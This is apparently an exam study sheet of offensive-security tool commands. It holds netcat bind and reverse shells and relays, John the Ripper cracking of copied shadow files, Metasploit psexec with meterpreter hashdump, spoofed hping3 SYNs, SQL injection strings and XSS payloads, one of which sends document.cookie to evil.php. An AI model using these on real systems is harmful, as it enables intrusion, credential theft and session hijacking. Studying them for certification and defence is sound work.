# Common Tools

## Exam Outcome

Demonstrate competence with common tools including netcat, SSH, Ettercap, p0f, etc...

### netcat

Setting up a Listener:

```
nc -l -p [port]
nc -l -p [2222]
```

Connecting to the Listener:

```
nc [ip_of_listener] [port]
nc 10.10.75.75 2222
```

Create backdoor on Linux:

```
nc -l [port] -e /bin/sh
nc -l 7777 -e /bin/sh
```

Connect to the backdoor:

```
nc.exe [ip_of_listener] [port]
nc.exe 10.10.75.75 7777
```

Create reverse shell on Windows
```
[Attacker] nc -l -p 8888
[Victim] nc 10.10.10.10 8888 -e cmd.exe
```

Pulling a file:

```
[Listener]echo "this is a test" > text.txt
[Listener]nc -l -p 1234 < text.txt

[Client]nc [Listerner IP] > received.txt
```

Pushing a file:

```
[Client]echo "test" > file.txt
[Listener]nc -l -p 4321 > received.txt
[Client] nc 10.10.10.1 4321 < file.txt
[Listener] type receive.txt
```

Create a Linux relay:

Run listening shell on Windows (victim):

```
nc -l -p 54321 -e cmd.exe
```

Create a FIFO named pipe on Linux (attacker):

```
mknod backpipe p
```

Create a relay and interact with the named pipe (attacker):

```
nc -l -p 11111 0<backpipe | nc 10.10.10.1 54321 1>backpipe
```

Open new terminal on Linux (attacker) and run netcat to connect to the relay:

```
nc 127.0.0.1 11111
```
Create a TCP Backpipe:

Create a Named Pipe
```
mknod backpipe /tmp/ncpipe
```

Create an NC relay which forwards the data from the listen service, to the target system.
```
nc -l -p <port> 0<backpipe | nc <TargetIP> <port> | tee backpipe
```
The backpipe in this instance (/tmp/ncpipe) is the location where data is stored and fed back into the pipe. Essentially completely a return loop!


### SSH

### Ettercap

### p0f

### John the Ripper

John the Ripper is essentially a password cracking tool.  You can utilize John the Ripper to perform password cracking once you've retrieved password hashes from a target.

First, you need to combine the passwd and shadow files (from a Linux machine).  The following examples assumes you've taken a copy of /etc/passwd and /etc/shadow and moved them to the /tmp directory:

```
./unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined
```

Running John is trival:

```
./john /tmp/combined
```

### Cain & Abel

Cain & Abel is an auditing tool that can be used for testing the strength of passwords on Windows machines.

### Metasploit

Starting Metasploit:

```
msfconsole
```

Listing exploits:

```
show exploits
```

Searching exploits:

```
search type:exploit psexec
```

Acquiring info on an exploit:

```
info exploit/windows/smb/psexec
```

Selecting an exploit to use:

```
use exploit/windows/smb/psexec
```

Configuring exploit settings:

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

Showing options:

```
show options
```

Configuring variables:

```
set RHOST [Target IP]
set SMBUser [username]
set SMBPass [password]
set LHOST [source/attacker IP]
```

Launching exploit:

```
exploit
```

Backgrounding a session:

```
background
```

Listing sessions:

```
sessions -l
```

```
sessions -i [session #]
```

Popular meterpreter commands:

```
?
sysinfo
getuid
pwd
getpid
ps
hashdump
run hashdump
```

### Volatility

Getting usage and help

```
python vol.py -h
```

Getting process list:

```
python vol.py pslist -f /path/to/memory/dump/mem.dd --profile=Win7SP0x86
```

### Hping3

Hping3 is a command-line packet analyzer that supports the TCP, UDP, ICMP, and RAW-IP protocols.

```
hping3 --help
```

Running hping3 with TCP SYN flags:

```
hping3 -S [IP address]
```

Running hping3 with TCP SYN flags and a spoofed source address:

```
hping3 [IP Address] -a [spoofed IP] -S
```

### Dumpsec

Dumpsec gathers information about a remote host without providing valid authentication; you gain info on registry, file system, and printers; users and groups; policies, rights, and services.


### SQL Injection

SQL Injection is the most common webbased attack. It is use when the hacker places commands which can trigger valid SQL queries within a field not typically associated with SQL commands. Fields like "Username" and "Password". But these types of command be inserted into any DB style entry field.

1. List Field Values #1:
An attacker may try the following to see if they can get a list of values from a particular field, user, pass, version, email, etc.

'0 OR 1=1'

Equivalent to the SQL Command:
'SELECT * FROM Users WHERE UserId = 0 OR 1=1;''

2. List Field Values #2:
An attacker may try the following to get a list of values from a particular field, user, pass, version, email, etc.

" or ""="

Equivalent to the SQL Command:
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""

3. Elevate privileges

"john'; INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'"

Equivalent to the SQL Command:
SELECT user_id, username, password_hash FROM users WHERE username = 'john'; 
INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'

### XSS Attacks

1. Black Box Testing

Enter the following in the url:

"hxxp://www.site.com/index.php?name=<script>alert(123)</script>"

2. Search Test
If the site has a serach field without proper sanitization:

"hxxp://www.site.com/search?source=“><script>alert(123)</script>"

3. One Error Test
If the site has a mouseover or onerror capability

"hxxp://www.site.com/index.php?name=<b onmouseover=alert('Wufff!')>click me!</b>"
"hxxp://www.site.com/index.php?name=<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>"


4. Cookie Stealer

"hxxp://www.site.com/index.php?name=<SCRIPT type="text/javascript"> var adr = '../evil.php?cakemonster=' + escape(document.cookie);</SCRIPT>"

5. Hide from javascript

"hxxp://www.site.com/index.php?name=<IMG SRC=j&#X41vascript:alert(123)>"

### etc...
